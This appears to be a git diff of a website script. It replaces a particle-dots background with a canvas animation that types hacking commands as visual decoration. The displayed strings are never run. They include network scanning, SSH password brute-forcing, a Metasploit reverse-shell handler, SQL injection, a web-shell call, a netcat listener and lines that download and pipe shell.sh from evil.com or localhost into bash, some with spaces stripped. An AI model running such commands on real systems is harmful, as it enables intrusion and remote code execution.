@@ -43,171 +43,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 });
 
-document.addEventListener('DOMContentLoaded', () => {
-    const canvas = document.getElementById('dots-canvas');
-    const ctx = canvas.getContext('2d');
-
-    // Set canvas size to window size
-    function resizeCanvas() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    }
-    resizeCanvas();
-    window.addEventListener('resize', resizeCanvas);
-
-    // Dot class
-    class Dot {
-        constructor(color) {
-            this.x = Math.random() * canvas.width;
-            this.y = Math.random() * canvas.height;
-            this.vx = (Math.random() - 0.5) * 2; // Increased movement speed
-            this.vy = (Math.random() - 0.5) * 2; // Increased movement speed
-            this.radius = 4;
-            this.baseRadius = 4;
-            this.maxRadius = 6;
-            this.density = (Math.random() * 40) + 1;
-            this.color = color;
-            this.originalColor = color;
-            this.willChangeColor = true;
-            this.isRed = Math.random() < 0.5; // Randomly start with red or white
-        }
-
-        draw() {
-            ctx.beginPath();
-            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
-            ctx.fillStyle = this.color;
-            ctx.fill();
-            ctx.closePath();
-        }
-
-        update() {
-            // Continuous movement
-            this.x += this.vx;
-            this.y += this.vy;
-
-            // Bounce off edges
-            if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
-            if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
-
-            // Mouse interaction
-            let dx = mouse.x - this.x;
-            let dy = mouse.y - this.y;
-            let distance = Math.sqrt(dx * dx + dy * dy);
-            let forceDirectionX = dx / distance;
-            let forceDirectionY = dy / distance;
-            let maxDistance = 120;
-            let force = (maxDistance - distance) / maxDistance;
-
-            if (force < 0) force = 0;
-
-            let directionX = forceDirectionX * force * this.density;
-            let directionY = forceDirectionY * force * this.density;
-
-            if (distance < maxDistance) {
-                this.x -= directionX * 1.5;
-                this.y -= directionY * 1.5;
-                this.radius = this.baseRadius + (force * 2);
-            } else {
-                this.radius = this.baseRadius;
-            }
-        }
-    }
-
-    // Mouse object
-    const mouse = {
-        x: null,
-        y: null,
-        radius: 120
-    };
-
-    // Handle mouse movement
-    window.addEventListener('mousemove', (event) => {
-        mouse.x = event.x;
-        mouse.y = event.y;
-    });
-
-    // Create dots with different colors
-    const dots = [];
-    const numberOfDots = 150;
-
-    // Create 60 red dots (40%)
-    for (let i = 0; i < 60; i++) {
-        dots.push(new Dot('rgba(255, 0, 0, 0.6)')); // Red
-    }
-
-    // Create 90 white dots (60%)
-    for (let i = 0; i < 90; i++) {
-        dots.push(new Dot('rgba(255, 255, 255, 0.6)')); // White
-    }
-
-    // Function to change colors after delay
-    setTimeout(() => {
-        // Get all white dots
-        const whiteDots = dots.filter(dot => dot.originalColor === 'rgba(255, 255, 255, 0.6)');
-        
-        // Calculate 25% for alternating dots
-        const alternatingDots = Math.floor(whiteDots.length * 0.25);
-        
-        // Set up 25% for alternating colors
-        for (let i = 0; i < alternatingDots; i++) {
-            const randomIndex = Math.floor(Math.random() * whiteDots.length);
-            const dot = whiteDots[randomIndex];
-            dot.willChangeColor = true;
-            dot.isRed = Math.random() < 0.5; // Randomly start with red or white
-            dot.color = dot.isRed ? 'rgba(255, 0, 0, 0.6)' : 'rgba(255, 255, 255, 0.6)';
-            whiteDots.splice(randomIndex, 1);
-        }
-    }, 1000);
-
-    // Animation loop
-    function animate() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        // Update and draw dots
-        dots.forEach(dot => {
-            dot.update();
-            dot.draw();
-            
-            // Handle alternating colors
-            if (dot.willChangeColor) {
-                if (Math.random() < 0.005) { // Changed from 0.01 to 0.005 for slower color changes
-                    dot.isRed = !dot.isRed;
-                    dot.color = dot.isRed ? 'rgba(255, 0, 0, 0.6)' : 'rgba(255, 255, 255, 0.6)';
-                }
-            }
-        });
-
-        // Draw lines between dots
-        dots.forEach((dot1, i) => {
-            dots.slice(i + 1).forEach(dot2 => {
-                let dx = dot1.x - dot2.x;
-                let dy = dot1.y - dot2.y;
-                let distance = Math.sqrt(dx * dx + dy * dy);
-
-                if (distance < 180) {
-                    ctx.beginPath();
-                    // Match line color to the dots it's connecting
-                    let lineColor;
-                    if (dot1.color === dot2.color) {
-                        lineColor = dot1.color;
-                    } else {
-                        lineColor = 'rgba(255, 255, 255, 0.3)';
-                    }
-                    ctx.strokeStyle = lineColor;
-                    ctx.lineWidth = 1;
-                    ctx.moveTo(dot1.x, dot1.y);
-                    ctx.lineTo(dot2.x, dot2.y);
-                    ctx.stroke();
-                }
-            });
-        });
-
-        requestAnimationFrame(animate);
-    }
-
-    animate();
-});
-
 // Mobile Menu Functionality
 const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
 const closeMenuBtn = document.querySelector('.close-menu-btn');
@@ -240,5 +75,235 @@ document.addEventListener('click', (e) => {
         mobileNav.classList.remove('active');
         document.body.style.overflow = '';
     }
+});
+
+class TerminalAnimation {
+    constructor(canvas) {
+        this.canvas = canvas;
+        this.ctx = canvas.getContext('2d');
+        this.terminals = [];
+        this.maxTerminals = 36;
+        this.lastTime = 0;
+        this.terminalInterval = 142;  // Changed to 142ms for exactly 7 terminals per second (1000ms/7 ≈ 142ms)
+        
+        // Create 36 positions in a grid-like pattern
+        this.positions = [];
+        
+        // Generate positions in a 6x6 grid
+        const rows = 6;
+        const cols = 6;
+        const paddingX = 50;
+        const paddingY = 50;
+        
+        for (let row = 0; row < rows; row++) {
+            for (let col = 0; col < cols; col++) {
+                const x = paddingX + (col * (this.canvas.width - 2 * paddingX) / (cols - 1));
+                const y = paddingY + (row * (this.canvas.height - 2 * paddingY) / (rows - 1));
+                // Add some random offset to make it less grid-like
+                const offsetX = (Math.random() - 0.5) * 50;
+                const offsetY = (Math.random() - 0.5) * 50;
+                this.positions.push({
+                    x: x + offsetX,
+                    y: y + offsetY
+                });
+            }
+        }
+        
+        // Terminal commands and code snippets
+        this.codeSnippets = [
+            "sudo nmap -sV -sC -p- 192.168.1.0/24",
+            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1",
+            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp;'",
+            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
+            "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+            "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+            "airmon-ng start wlan0",
+            "tcpdump -i eth0 -w capture.pcap",
+            "python3 exploit.py -t 10.0.0.1 -p 4444",
+            "curl -X POST -d 'cmd=whoami' http://target.com/shell.php",
+            "tcpdump -ieth0port80",
+            "nc-nlvp4444",
+            "telnet<9000><127.0.0.1>",
+            "ping-c4<127.0.0.1>",
+            "traceroute<127.0.0.1>",
+            "wgethttp://evil.com/shell.sh",
+            "curlhttp://127.0.0.1:8000/shell.sh|bash",
+        ];
+        
+        // Set canvas size
+        this.resize();
+        window.addEventListener('resize', () => this.resize());
+        
+        // Start animation
+        this.animate();
+    }
+    
+    resize() {
+        this.canvas.width = window.innerWidth;
+        this.canvas.height = window.innerHeight;
+        
+        // Regenerate positions on resize
+        this.positions = [];
+        const rows = 6;
+        const cols = 6;
+        const paddingX = 50;
+        const paddingY = 50;
+        
+        for (let row = 0; row < rows; row++) {
+            for (let col = 0; col < cols; col++) {
+                const x = paddingX + (col * (this.canvas.width - 2 * paddingX) / (cols - 1));
+                const y = paddingY + (row * (this.canvas.height - 2 * paddingY) / (rows - 1));
+                // Add some random offset to make it less grid-like
+                const offsetX = (Math.random() - 0.5) * 50;
+                const offsetY = (Math.random() - 0.5) * 50;
+                this.positions.push({
+                    x: x + offsetX,
+                    y: y + offsetY
+                });
+            }
+        }
+    }
+    
+    getRandomPosition() {
+        // Get a random position that's not currently in use
+        const usedPositions = this.terminals.map(t => t.positionIndex);
+        const availablePositions = this.positions
+            .map((pos, index) => ({ pos, index }))
+            .filter(({ index }) => !usedPositions.includes(index));
+        
+        if (availablePositions.length === 0) return null;
+        
+        const randomIndex = Math.floor(Math.random() * availablePositions.length);
+        return availablePositions[randomIndex];
+    }
+    
+    createTerminal() {
+        const position = this.getRandomPosition();
+        if (!position) return null;
+        
+        // Determine if this terminal should be red (3 out of 7)
+        const shouldBeRed = (this.terminals.length % 7) < 3;
+        
+        const terminal = {
+            x: position.pos.x,
+            y: position.pos.y,
+            positionIndex: position.index,
+            width: 350,
+            height: 150,
+            text: "",
+            targetText: this.codeSnippets[Math.floor(Math.random() * this.codeSnippets.length)],
+            progress: 0,
+            speed: Math.random() * 0.05 + 0.02,
+            cursorBlink: 0,
+            state: 'typing',
+            waitTime: 0,
+            color: shouldBeRed ? 
+                `rgba(255, 0, 0, ${Math.random() * 0.3 + 0.7})` :  // Red color
+                `rgba(0, 255, 0, ${Math.random() * 0.3 + 0.7})`    // Green color
+        };
+        return terminal;
+    }
+    
+    drawTerminal(terminal) {
+        // Draw text only
+        this.ctx.font = '14px "Courier New", monospace';
+        this.ctx.fillStyle = terminal.color;
+        
+        const text = terminal.text;
+        const lines = text.split('\n');
+        const lineHeight = 20;
+        
+        lines.forEach((line, index) => {
+            this.ctx.fillText(line, terminal.x + 10, terminal.y + 25 + (index * lineHeight));
+        });
+        
+        // Draw cursor
+        if (terminal.state === 'typing' || terminal.state === 'waiting') {
+            const cursorX = terminal.x + 10 + this.ctx.measureText(text).width;
+            const cursorY = terminal.y + 25;
+            
+            if (terminal.cursorBlink < 0.5) {
+                this.ctx.fillStyle = terminal.color;
+                this.ctx.fillRect(cursorX, cursorY - 14, 8, 2);
+            }
+        }
+    }
+    
+    update(time) {
+        // Clear canvas with fade effect
+        this.ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
+        
+        // Add new terminals
+        if (time - this.lastTime > this.terminalInterval) {
+            if (this.terminals.length < this.maxTerminals) {
+                const newTerminal = this.createTerminal();
+                if (newTerminal) {
+                    this.terminals.push(newTerminal);
+                }
+            }
+            this.lastTime = time;
+        }
+        
+        // Update and draw terminals
+        this.terminals = this.terminals.filter(terminal => {
+            // Update cursor blink
+            terminal.cursorBlink = (terminal.cursorBlink + 0.1) % 1;
+            
+            // Update terminal state
+            switch(terminal.state) {
+                case 'typing':
+                    if (terminal.progress < 1) {
+                        terminal.progress += terminal.speed;
+                        terminal.text = terminal.targetText.substring(0, Math.floor(terminal.targetText.length * terminal.progress));
+                    } else {
+                        terminal.state = 'waiting';
+                        terminal.waitTime = time;
+                    }
+                    break;
+                    
+                case 'waiting':
+                    if (time - terminal.waitTime > 2000) {
+                        terminal.state = 'erasing';
+                        terminal.progress = 1;
+                    }
+                    break;
+                    
+                case 'erasing':
+                    terminal.progress -= terminal.speed * 0.5;
+                    terminal.text = terminal.targetText.substring(0, Math.floor(terminal.targetText.length * terminal.progress));
+                    if (terminal.progress <= 0) {
+                        // Instead of continuing at the same position, remove this terminal
+                        return false;
+                    }
+                    break;
+            }
+            
+            this.drawTerminal(terminal);
+            return true;
+        });
+    }
+    
+    animate(time = 0) {
+        this.update(time);
+        requestAnimationFrame((t) => this.animate(t));
+    }
+}
+
+// Initialize terminal animation for hero section
+function initTerminalAnimation() {
+    const heroSection = document.querySelector('.hero');
+    if (!heroSection) return;
+    
+    const canvas = document.createElement('canvas');
+    canvas.id = 'terminal-canvas';
+    heroSection.appendChild(canvas);
+    
+    new TerminalAnimation(canvas);
+}
+
+// Initialize terminal animation when DOM is loaded
+document.addEventListener('DOMContentLoaded', () => {
+    initTerminalAnimation();
 }); 
 
